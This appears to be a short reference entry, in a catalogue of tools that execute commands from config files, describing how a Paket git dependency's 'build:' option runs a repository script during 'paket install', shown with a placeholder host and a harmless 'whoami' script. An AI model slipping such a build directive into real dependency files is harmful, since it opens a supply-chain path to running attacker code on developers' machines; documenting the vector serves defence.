---
title: Paket
tags:
  - cli
  - config-file
  - eval-sh
files: [paket.dependencies, paket.lock]
references:
  - https://fsprojects.github.io/Paket/git-dependencies.html
---

Paket is a dependency manager for .NET projects. Git dependencies support explicit build commands.

## `paket.dependencies`

An attacker controlling the dependency declaration and selected Git repository can supply a build script:

```text
git https://example.invalid/owner/repository.git main build:"build.sh"
```

Sample `build.sh` in that repository:

```sh
#!/bin/sh
whoami
```

```console
paket install
```

Paket executes the configured command in the downloaded source tree.
